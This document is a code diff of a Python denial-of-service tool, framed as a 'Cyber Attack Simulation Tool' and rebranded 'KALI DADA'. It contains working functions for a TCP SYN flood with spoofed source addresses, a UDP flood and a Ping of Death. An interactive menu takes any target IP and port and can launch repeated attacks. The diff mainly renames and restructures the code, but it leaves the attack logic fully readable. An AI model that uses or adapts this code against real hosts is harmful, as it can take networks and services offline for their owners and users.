@@ -13,6 +13,9 @@ YELLOW = "\033[93m"
 BOLD   = "\033[1m"
 RESET  = "\033[0m"
 
+# Your name for display
+NAME = "Sujal Lamichhane"
+
 def print_warning():
     """Display a warning message before starting."""
     os.system("clear")
@@ -28,8 +31,8 @@ def print_warning():
     print(warning_message)
     time.sleep(3)
 
-def print_hacker_banner():
-    """Display hacker-style banner and website info only once."""
+def print_kali_dada_banner():
+    """Display the KALI DADA banner and website info."""
     os.system("clear")
     banner = f"""
 {GREEN}{BOLD}
@@ -42,10 +45,10 @@ def print_hacker_banner():
   ░   ░  ▒ ░▒░ ░  ▒   ▒▒ ░░ ░ ▒  ░░ ░ ▒  ░  ░ ▒ ▒░   ░▒ ░ ▒░
 ░ ░   ░  ░  ░░ ░  ░   ▒     ░ ░     ░ ░   ░ ░ ░ ▒    ░░   ░ 
       ░  ░  ░  ░      ░  ░    ░  ░    ░  ░    ░ ░     ░     
-               {CYAN}Welcome to the Cyber Attack Simulation Tool{RESET}
+               {CYAN}Welcome to KALI DADA's Cyber Attack Simulation Tool{RESET}
 """
     print(banner)
-    print(f"{YELLOW}Created by: Sujal Lamichhane | Cyber Security Enthusiast{RESET}")
+    print(f"{YELLOW}Created by: {NAME}{RESET}")
     print(f"{CYAN}Website: sujallamichhane.com.np{RESET}")
     print(f"{CYAN}[INFO] Visit: sujallamichhane.com.np for more cybersecurity insights!{RESET}\n")
     time.sleep(1)
@@ -71,8 +74,8 @@ def syn_flood(target_ip, target_port, duration):
     print(f"{YELLOW}[+] Starting TCP SYN Flood Attack on {target_ip}:{target_port}{RESET}")
     timeout = time.time() + duration
     packet_count = 0
-    while time.time() < timeout:
-        try:
+    try:
+        while time.time() < timeout:
             # Generate a random source IP
             src_ip = ".".join(map(str, (random.randint(1, 255) for _ in range(4))))
             packet = IP(src=src_ip, dst=target_ip) / TCP(sport=random.randint(1024, 65535),
@@ -80,9 +83,9 @@ def syn_flood(target_ip, target_port, duration):
             send(packet, verbose=False)
             packet_count += 1
             print(f"{CYAN}[PACKETS SENT: {packet_count}]{RESET}", end="\r")
-        except Exception as e:
-            print(f"\n{RED}[ERROR] Issue with sending SYN packets: {e}{RESET}")
-            break
+    except KeyboardInterrupt:
+        print(f"\n{RED}[INFO] Stopping TCP SYN Flood Attack...{RESET}")
+        print(f"{GREEN}Happy Hacking!{RESET}")
     print(f"\n{GREEN}[+] SYN Flood Attack Completed. Packets Sent: {packet_count}{RESET}")
 
 def udp_flood(target_ip, target_port, duration):
@@ -96,14 +99,14 @@ def udp_flood(target_ip, target_port, duration):
         return
     timeout = time.time() + duration
     packet_count = 0
-    while time.time() < timeout:
-        try:
+    try:
+        while time.time() < timeout:
             sock.sendto(packet, (target_ip, target_port))
             packet_count += 1
             print(f"{CYAN}[PACKETS SENT: {packet_count}]{RESET}", end="\r")
-        except Exception as e:
-            print(f"\n{RED}[ERROR] Issue with sending UDP packets: {e}{RESET}")
-            break
+    except KeyboardInterrupt:
+        print(f"\n{RED}[INFO] Stopping UDP Flood Attack...{RESET}")
+        print(f"{GREEN}Happy Hacking!{RESET}")
     print(f"\n{GREEN}[+] UDP Flood Attack Completed. Packets Sent: {packet_count}{RESET}")
 
 def ping_of_death(target_ip, duration):
@@ -111,21 +114,19 @@ def ping_of_death(target_ip, duration):
     print(f"{YELLOW}[+] Starting Ping of Death Attack on {target_ip}{RESET}")
     timeout = time.time() + duration
     packet_count = 0
-    while time.time() < timeout:
-        try:
+    try:
+        while time.time() < timeout:
             packet = IP(dst=target_ip) / ICMP() / (b"X" * 65500)
             send(packet, verbose=False)
             packet_count += 1
             print(f"{CYAN}[PACKETS SENT: {packet_count}]{RESET}", end="\r")
-        except Exception as e:
-            print(f"\n{RED}[ERROR] Issue with sending Ping of Death packets: {e}{RESET}")
-            break
+    except KeyboardInterrupt:
+        print(f"\n{RED}[INFO] Stopping Ping of Death Attack...{RESET}")
+        print(f"{GREEN}Happy Hacking!{RESET}")
     print(f"\n{GREEN}[+] Ping of Death Attack Completed. Packets Sent: {packet_count}{RESET}")
 
-def main():
-    print_hacker_banner()
-    check_root()
-    
+def select_attack():
+    """Prompt user to select the type of attack."""
     while True:
         print(f"{BOLD}{YELLOW}\nSelect Attack Type:{RESET}")
         print("1: TCP SYN Flood")
@@ -167,8 +168,17 @@ def main():
             udp_flood(target_ip, target_port, duration)
         elif choice == 3:
             ping_of_death(target_ip, duration)
-        else:
-            print(f"{RED}[ERROR] Invalid option selected.{RESET}")
+        
+        # After completing the attack, ask the user if they want to continue
+        continue_choice = input(f"{CYAN}Do you want to perform another attack? (y/n): {RESET}").strip().lower()
+        if continue_choice != 'y':
+            print(f"{GREEN}Exiting...{RESET}")
+            break
+
+def main():
+    print_kali_dada_banner()
+    check_root()
+    select_attack()
 
 if __name__ == "__main__":
     print_warning()
